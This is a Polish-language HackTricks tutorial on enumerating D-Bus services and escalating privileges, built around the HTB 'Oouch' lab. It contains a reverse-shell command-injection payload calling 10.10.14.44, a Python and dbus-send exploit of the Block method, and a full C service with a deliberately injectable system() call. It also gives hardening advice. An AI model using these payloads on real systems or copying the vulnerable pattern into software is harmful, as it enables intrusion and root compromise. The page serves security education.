# Enumeracja D-Bus i eskalacja uprawnień przez command injection

{{#include ../../banners/hacktricks-training.md}}

## **Enumeracja GUI**

D-Bus pełni funkcję mediatora komunikacji międzyprocesowej (IPC) w środowiskach graficznych Ubuntu. W Ubuntu działa jednocześnie kilka magistral komunikatów: magistrala systemowa, wykorzystywana głównie przez **uprzywilejowane usługi do udostępniania usług istotnych dla całego systemu**, oraz magistrala sesji dla każdego zalogowanego użytkownika, udostępniająca usługi istotne wyłącznie dla tego użytkownika. Skupiamy się przede wszystkim na magistrali systemowej ze względu na jej powiązanie z usługami działającymi z wyższymi uprawnieniami (np. jako root), ponieważ naszym celem jest eskalacja uprawnień. Architektura D-Bus wykorzystuje „router” dla każdej magistrali sesji, który przekierowuje komunikaty klientów do odpowiednich usług na podstawie adresu podanego przez klientów dla usługi, z którą chcą się komunikować.<sup>[[1]](#references)</sup>

Usługi w D-Bus są definiowane przez udostępniane przez nie **obiekty** i **interfejsy**. Obiekty można porównać do instancji klas w standardowych językach OOP; każda instancja jest jednoznacznie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobnie jak ścieżka w systemie plików, jednoznacznie identyfikuje każdy obiekt udostępniany przez usługę. Ważnym z punktu widzenia analizy interfejsem jest **org.freedesktop.DBus.Introspectable**, który zawiera jedną metodę: Introspect. Metoda ta zwraca reprezentację XML obsługiwanych przez obiekt metod, sygnałów i właściwości. Skupiamy się tu na metodach, pomijając właściwości i sygnały.

Do komunikacji z interfejsem D-Bus użyto dwóch narzędzi: narzędzia CLI o nazwie **gdbus**, które ułatwia wywoływanie w skryptach metod udostępnianych przez D-Bus, oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) — narzędzia GUI opartego na Pythonie, zaprojektowanego do enumerowania usług dostępnych na każdej magistrali i wyświetlania obiektów zawartych w każdej usłudze.

```bash
sudo apt-get install d-feet
```

Jeśli sprawdzasz **session bus**, najpierw potwierdź aktualny adres:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Na pierwszym obrazie pokazano usługi zarejestrowane w systemowej magistrali D-Bus; **org.debin.apt** jest wyróżniona po wybraniu przycisku System Bus. D-Feet odpytuje tę usługę o obiekty, a następnie wyświetla interfejsy, metody, właściwości i sygnały wybranych obiektów, co widać na drugim obrazie. Szczegółowo opisano też sygnaturę każdej metody.

Przydatną funkcją jest wyświetlanie **identyfikatora procesu (pid)** i **wiersza poleceń** usługi, co pozwala sprawdzić, czy działa ona z podwyższonymi uprawnieniami — istotna kwestia z punktu widzenia badań.

**D-Feet pozwala również wywoływać metody**: użytkownicy mogą podawać wyrażenia Pythona jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem ich do usługi.

Należy jednak pamiętać, że **niektóre metody wymagają uwierzytelnienia**, zanim będzie można je wywołać. Pominiemy je, ponieważ naszym celem jest podniesienie uprawnień bez danych uwierzytelniających.

Warto też zauważyć, że niektóre usługi pytają inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć możliwość wykonania określonych działań.

## **Enumeracja z wiersza poleceń**

### Wyświetlanie obiektów usługi

Można wyświetlić otwarte interfejsy D-Bus za pomocą:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Usługi oznaczone jako **`(activatable)`** są szczególnie interesujące, ponieważ **jeszcze nie działają**, ale żądanie wysłane przez bus może uruchomić je na żądanie. Nie poprzestawaj na `busctl list`; ustal, jakie pliki binarne są uruchamiane dla tych nazw.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

To szybko pokazuje, która ścieżka `Exec=` zostanie uruchomiona dla aktywowalnej nazwy i z jaką tożsamością. Jeśli plik binarny lub łańcuch jego uruchamiania są słabo zabezpieczone, nieaktywna usługa nadal może stanowić ścieżkę do eskalacji uprawnień.

W przypadku uprzywilejowanej usługi do tworzenia obrazów USB powiąż jej nazwę na system busie z **efektywną** polityką dotyczącą akcji zapisu obrazu. Starsza reguła dostawcy może przyznawać administracyjnej grupie Unix `ResultActive=yes` bez żądania hasła; sprawdź, czy bieżące konto należy do tej grupy, sesja jest aktywna, reguła jest faktycznie załadowana i nie została nadpisana, a zainstalowany helper nadal akceptuje wybrane przez wywołującego ścieżki źródłowe i docelowe. Sam deskryptor usługi lub stara wersja pakietu nie dowodzą, że możliwy jest dostęp do dowolnych plików. Brak deskryptora aktywacji nie wyklucza też działającej już usługi. Sprawdź niezmienne pliki polityki i usługi, nie wywołując metody zapisu obrazu; zobacz [oryginalną analizę usługi](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Połączenia

[Z Wikipedii:](https://en.wikipedia.org/wiki/D-Bus) Gdy proces nawiązuje połączenie z bus, bus przypisuje temu połączeniu specjalną nazwę busa, zwaną _unikalną nazwą połączenia_. Nazwy busa tego typu są niezmienne — gwarantuje się, że nie ulegną zmianie, dopóki istnieje połączenie — i, co ważniejsze, nie można ich ponownie użyć przez cały czas działania busa. Oznacza to, że żadne inne połączenie z tym busem nigdy nie otrzyma takiej unikalnej nazwy połączenia, nawet jeśli ten sam proces zamknie połączenie z busem i utworzy nowe. Unikalne nazwy połączeń można łatwo rozpoznać, ponieważ zaczynają się od dwukropka — znaku, którego poza tym nie wolno używać.<sup>[[4]](#references)</sup>

### Informacje o obiekcie usługi

Następnie możesz uzyskać informacje o interfejsie za pomocą:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Powiąż także nazwę magistrali z odpowiadającą jej jednostką `systemd` i ścieżką pliku wykonywalnego:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

To odpowiada na istotne podczas privesc pytanie operacyjne: **jeśli wywołanie metody się powiedzie, który rzeczywisty plik binarny i która jednostka wykonają działanie?**

### Wyświetlanie interfejsów obiektu usługi

Musisz mieć wystarczające uprawnienia.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Interfejs introspekcji obiektu usługi

Zwróć uwagę, że w tym przykładzie wybrano najnowszy interfejs wykryty za pomocą parametru `tree` (_zobacz poprzednią sekcję_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Zwróć uwagę na metodę `.Block` interfejsu `htb.oouch.Block` (tę, która nas interesuje). Litera „s” w pozostałych kolumnach może oznaczać, że oczekuje on ciągu znaków.

Zanim spróbujesz czegoś niebezpiecznego, najpierw zweryfikuj metodę służącą do odczytu lub inną metodę niskiego ryzyka. Pozwala to łatwo rozróżnić trzy przypadki: nieprawidłową składnię, metodę dostępną, ale zablokowaną, oraz metodę dostępną i dozwoloną.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Powiąż metody D-Bus z politykami i działaniami

Introspekcja informuje, **co** możesz wywołać, ale nie wyjaśnia, **dlaczego** wywołanie jest dozwolone lub odrzucone. Aby rzetelnie przeprowadzić analizę privesc, zwykle trzeba sprawdzić jednocześnie **trzy warstwy**:

1. **Metadane aktywacji** (pliki `.service` lub `SystemdService=`), aby ustalić, jaki plik binarny i jednostka zostaną faktycznie uruchomione.
2. **Politykę XML D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), aby ustalić, kto może używać `own`, `send_destination` lub `receive_sender`.
3. **Pliki akcji Polkit** (`/usr/share/polkit-1/actions/*.policy`), aby poznać domyślny model autoryzacji (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Przydatne polecenia:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Nie zakładaj mapowania 1:1 między metodą D-Bus a akcją Polkit. Ta sama metoda może wybrać inną akcję w zależności od modyfikowanego obiektu lub kontekstu runtime. Dlatego praktyczny workflow wygląda następująco:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` i przeszukanie odpowiednich plików `.policy`
3. Niskiego ryzyka sondowanie na żywo za pomocą `busctl call`, `gdbus call` lub `dbusmap --enable-probes --null-agent`

Usługi proxy lub kompatybilności wymagają szczególnej uwagi. **Proxy działające jako root**, które przekazuje żądania do innej usługi D-Bus za pośrednictwem własnego, wcześniej ustanowionego połączenia, może nieumyślnie sprawić, że backend będzie traktować każde żądanie jako pochodzące od UID 0, o ile tożsamość pierwotnego wywołującego nie zostanie ponownie zweryfikowana.<sup>[[3]](#references)</sup>

### Interfejs monitorowania/przechwytywania

Mając wystarczające uprawnienia (same uprawnienia `send_destination` i `receive_sender` nie wystarczą), możesz **monitorować komunikację D-Bus**.

Aby **monitorować** **komunikację**, musisz być użytkownikiem **root**. Jeśli mimo to napotkasz problemy, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **umożliwić użytkownikom innym niż root podsłuchiwanie** komunikacji, proszę **skontaktuj się ze mną**!

Różne sposoby monitorowania:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

W poniższym przykładzie monitorowany jest interfejs `htb.oouch.Block`, a **wiadomość "**_**lalalalal**_**" jest wysyłana wskutek błędnej komunikacji**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku **pcapng**, który można otworzyć w Wireshark:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Filtrowanie całego szumu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Jeśli na magistrali jest po prostu zbyt dużo informacji, przekaż regułę dopasowania w ten sposób:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Można określić wiele reguł. Jeśli wiadomość pasuje do _którejkolwiek_ z reguł, zostanie wyświetlona. Na przykład:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Zobacz [dokumentację D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html), aby uzyskać więcej informacji o składni reguł dopasowania.<sup>[[7]](#references)</sup>

### Więcej

`busctl` ma jeszcze więcej opcji, [**znajdziesz je tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Podatny scenariusz**

Jako użytkownik **qtc na hoście „oouch” z HTB** możesz znaleźć **nieoczekiwany plik konfiguracyjny D-Bus** w lokalizacji _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Z poprzedniej konfiguracji wynika, że **aby wysyłać i odbierać informacje** za pośrednictwem tej komunikacji D-BUS, musisz działać jako użytkownik `root` lub `www-data`.

Jako użytkownik **qtc** w kontenerze dockera **aeb4525789d8** możesz znaleźć kod związany z dbus w pliku _/code/oouch/routes.py._ Oto interesujący fragment:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Jak widać, **łączy się z interfejsem D-Bus** i wysyła do funkcji **„Block”** wartość „client_ip”.

Po drugiej stronie połączenia D-Bus działa skompilowany binarny program w C. Ten kod **nasłuchuje** połączenia D-Bus **w oczekiwaniu na adres IP i wywołuje iptables za pomocą funkcji `system`**, aby zablokować podany adres IP.\
**Wywołanie `system` jest celowo podatne na command injection**, więc payload taki jak poniższy utworzy reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Wykorzystaj to

Na końcu tej strony znajdziesz **pełny kod aplikacji D-Bus w C**. W liniach 91–97 możesz zobaczyć, jak są **rejestrowane `D-Bus object path`** oraz **`interface name`**. Te informacje będą potrzebne do wysłania danych do połączenia D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Ponadto w wierszu 57 można zauważyć, że **jedyną metodą zarejestrowaną** dla tej komunikacji D-Bus jest `Block`(_**Dlatego w następnej sekcji payloady będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i metody `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Poniższy kod w Pythonie wyśle payload do połączenia D-Bus, do metody `Block`, za pomocą `block_iface.Block(runme)` (_zwróć uwagę, że został wyodrębniony z poprzedniego fragmentu kodu_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` to narzędzie służące do wysyłania wiadomości do „Message Bus”
- Message Bus – oprogramowanie używane przez systemy, które ułatwia komunikację między aplikacjami. Jest powiązane z Message Queue (wiadomości są uporządkowane w sekwencji), ale w Message Bus wiadomości są wysyłane w modelu subskrypcji i bardzo szybko.
- Tag „-system” służy do wskazania, że jest to wiadomość systemowa, a nie sesyjna (domyślnie).
- Tag „–print-reply” służy do prawidłowego wyświetlenia naszej wiadomości oraz odbierania odpowiedzi w formacie czytelnym dla człowieka.
- „–dest=Dbus-Interface-Block” Adres interfejsu Dbus.
- „–string:” – Typ wiadomości, którą chcemy wysłać do interfejsu. Wiadomości można wysyłać w kilku formatach, takich jak double, bytes, booleans, int i objpath. Spośród nich „object path” jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. Możemy w tym celu użyć pliku specjalnego (FIFO), aby przekazać polecenie do interfejsu pod postacią nazwy pliku. „string:;” – służy do ponownego wywołania object path, w którym umieszczamy plik/polecenie reverse shell FIFO.

_Należy pamiętać, że w `htb.oouch.Block.Block` pierwsza część (`htb.oouch.Block`) odnosi się do obiektu usługi, a ostatnia (`.Block`) do nazwy metody._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Zautomatyzowane narzędzia pomocnicze do enumeracji (2023–2025)

Ręczna enumeracja dużej powierzchni ataku D-Bus za pomocą `busctl`/`gdbus` szybko staje się uciążliwa. Dwa niewielkie narzędzia FOSS wydane w ostatnich latach mogą przyspieszyć pracę podczas działań red-team lub CTF:

### dbusmap („Nmap dla D-Bus”)
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Napisane w C; pojedynczy statyczny plik binarny (<50 kB), który przechodzi przez wszystkie ścieżki obiektów, pobiera XML `Introspect` i mapuje go na PID/UID właściciela.<sup>[[5]](#references)</sup>
* Przydatne flagi:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Narzędzie oznacza `!` niezabezpieczone well-known names, natychmiast ujawniając usługi, które możesz *przejąć* (take over), lub wywołania metod dostępne z powłoki bez uprawnień.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Skrypt wyłącznie w Pythonie, który wyszukuje *zapisywalne* ścieżki w jednostkach systemd **oraz** pliki zasad D-Bus z nadmiernie liberalnymi uprawnieniami (np. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Szybkie użycie:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Moduł D-Bus przeszukuje poniższe katalogi i wyróżnia usługi, które mogą zostać podszyte lub przejęte przez zwykłego użytkownika:
  * `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (nadpisania dostawcy)

---

## Znane błędy eskalacji uprawnień D-Bus (2024–2025)

Śledzenie niedawno opublikowanych CVE pomaga dostrzegać podobne niebezpieczne wzorce w niestandardowym kodzie. Dwa dobre, aktualne przykłady to:<sup>[[2]](#references)[[3]](#references)</sup>

| Rok | CVE | Komponent | Przyczyna źródłowa | Wniosek ofensywny |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Usługa działająca jako root udostępniała interfejs D-Bus, który nieuprzywilejowani użytkownicy mogli rekonfigurować, między innymi wczytując zachowanie makr kontrolowane przez atakującego. | Jeśli demon udostępnia w magistrali systemowej **zarządzanie urządzeniami/profilami/konfiguracją**, traktuj zapisywalną konfigurację i funkcje makr jako prymitywy wykonania kodu, a nie tylko „ustawienia”. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Proxy zgodności działające jako root przekazywało żądania do usług zaplecza bez zachowania kontekstu bezpieczeństwa pierwotnego wywołującego, przez co usługi zaplecza ufały proxy jako UID 0. | Traktuj usługi D-Bus typu **proxy / bridge / compatibility** jako odrębną klasę błędów: jeśli przekazują uprzywilejowane wywołania, sprawdź, jak UID wywołującego i kontekst Polkit są przekazywane do usługi zaplecza. |

Zwróć uwagę na następujące wzorce:
1. Usługa działa **jako root w magistrali systemowej**.
2. Brak **kontroli autoryzacji** albo kontrola jest wykonywana względem **niewłaściwego podmiotu**.
3. Dostępna metoda ostatecznie zmienia stan systemu: instaluje pakiety, zmienia użytkowników/grupy, modyfikuje konfigurację bootloadera, aktualizuje profile urządzeń, zapisuje pliki lub bezpośrednio wykonuje polecenia.

Użyj `dbusmap --enable-probes` lub ręcznego wywołania `busctl call`, aby potwierdzić, czy metoda jest dostępna, a następnie sprawdź XML zasad usługi i akcje Polkit, aby ustalić, **który podmiot** jest faktycznie autoryzowany.

---

## Szybkie działania wzmacniające zabezpieczenia i usprawniające wykrywanie

* Wyszukaj zasady z uprawnieniami do zapisu dla wszystkich lub otwarte dla *wysyłania/odbierania*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Wymagaj Polkit dla niebezpiecznych metod — nawet proxy działające jako *root* powinny przekazywać PID *wywołującego* do `polkit_authority_check_authorization_sync()`, a nie własny.
* Ogranicz uprawnienia długo działających helperów (użyj `sd_pid_get_owner_uid()`, aby przełączyć przestrzenie nazw po połączeniu z magistralą).
* Jeśli nie możesz usunąć usługi, przynajmniej ogranicz ją do dedykowanej grupy Unix i ogranicz dostęp w jej polityce XML.
* Blue-team: przechwyć magistralę systemową za pomocą `busctl capture > /var/log/dbus_$(date +%F).pcapng` i zaimportuj plik do Wireshark w celu wykrywania anomalii.

---

## References

- [1] [Eskalacja uprawnień przez USBCreator D-Bus w Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: Usługa D-Bus umożliwia konfigurację dowolnemu nieuprzywilejowanemu użytkownikowi](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Ominięcie uwierzytelniania w usłudze proxy D-Bus Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
